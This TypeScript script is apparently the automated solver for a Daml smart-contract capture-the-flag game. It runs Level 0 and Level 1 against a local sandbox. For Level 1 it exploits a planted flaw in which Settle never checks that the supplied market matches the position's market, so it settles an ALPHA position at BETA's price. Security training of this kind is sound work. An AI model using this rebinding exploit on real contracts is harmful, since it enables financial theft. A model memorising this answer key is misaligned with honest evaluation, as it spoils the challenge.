// Headless player: solves Level 0 and Level 1 against a local sandbox + backend
// using the same JSON Ledger API v2 calls the wallet would sign. Used for the
// demo video and as an end-to-end smoke test:  npx tsx scripts/demo-solve.mts
import { JsonApiClient } from '../shared/jsonLedgerApi.js';
import { DAMLNAUT_USER_ID, templateId } from '../shared/damlnaut.js';

const API = process.env.DAML_JSON_API_URL ?? 'http://localhost:7575';
const BACKEND = process.env.BACKEND_URL ?? 'http://localhost:8787';
// In a multi-participant setup the player lives on PLAYER_JSON_API_URL (participant2).
const PLAYER_API = process.env.PLAYER_JSON_API_URL ?? API;
const c = new JsonApiClient({ baseUrl: PLAYER_API });
const step = (m: string) => console.log(`\n\x1b[36m▶ ${m}\x1b[0m`);
const post = async (p: string, body: unknown) =>
  (await fetch(`${BACKEND}${p}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) })).json() as Promise<any>;

const health = await (await fetch(`${BACKEND}/api/health`)).json() as any;
const issuer: string = health.issuer;
step(`backend ready, issuer = ${issuer.slice(0, 28)}…  player participant = ${PLAYER_API}`);

const sync = (await c.connectedSynchronizers()).connectedSynchronizers[0].synchronizerId;
const hint = `damlnaut-player-${Date.now().toString(36)}`;
const player = (await c.allocateParty({ partyIdHint: hint, synchronizerId: sync })).partyDetails.party;
step(`allocated player ${player.slice(0, 32)}…`);
const run = (id: string, commands: any[]) =>
  c.submitAndWait({ userId: DAMLNAUT_USER_ID, commandId: `${id}-${Date.now()}`, actAs: [player], commands });
const mine = async () => (await c.activeContractsFor(player)).filter((e) => (e.createArgument as any).player === player || (e.createArgument as any).solver === player);

// ---- Level 0 ----
step('LEVEL 0 — create instance, exercise SubmitLevel0');
const L0 = templateId('Damlnaut.Level0', 'Level0Instance');
await run('l0-create', [{ CreateCommand: { templateId: L0, createArguments: { player, issuer, instanceId: 'demo-l0', instructions: 'submit' } } }]);
const inst = (await mine()).find((e) => e.templateId.includes('Level0Instance'))!;
await run('l0-submit', [{ ExerciseCommand: { templateId: L0, contractId: inst.contractId, choice: 'SubmitLevel0', choiceArgument: {} } }]);
const v0 = await post('/api/levels/0/verify', { party: player });
console.log('  verified:', v0.verified, '→', v0.flag?.payload?.flagValue ?? v0.message);

// ---- Level 1 ----
step('LEVEL 1 — Market rebinding (Settle never checks marketCid == market)');
const b = await post('/api/levels/1/bootstrap', { party: player });
const alpha = b.markets.find((m: any) => m.payload.symbol === 'ALPHA');
const beta = b.markets.find((m: any) => m.payload.symbol === 'BETA');
console.log(`  Position is bound to ALPHA; we will settle against BETA (${beta.payload.price})`);
const P1 = templateId('Damlnaut.Level1', 'Position');
let pos = b.position;
if (!pos) {
  await run('l1-open', [{ CreateCommand: { templateId: P1, createArguments: { player, curator: issuer, market: alpha.contractId, size: '1.0', instanceId: 'demo-l1' } } }]);
  pos = (await mine()).find((e) => e.templateId.includes('Position'));
}
await run('l1-settle', [{ ExerciseCommand: { templateId: P1, contractId: pos.contractId, choice: 'Settle', choiceArgument: { marketCid: beta.contractId } } }]);
const v1 = await post('/api/levels/1/verify', { party: player });
console.log('  verified:', v1.verified, '→', v1.flag?.payload?.flagValue ?? v1.message);
if (!v0.verified || !v1.verified) process.exit(1);
console.log('\n\x1b[32m✔ both flags captured\x1b[0m');
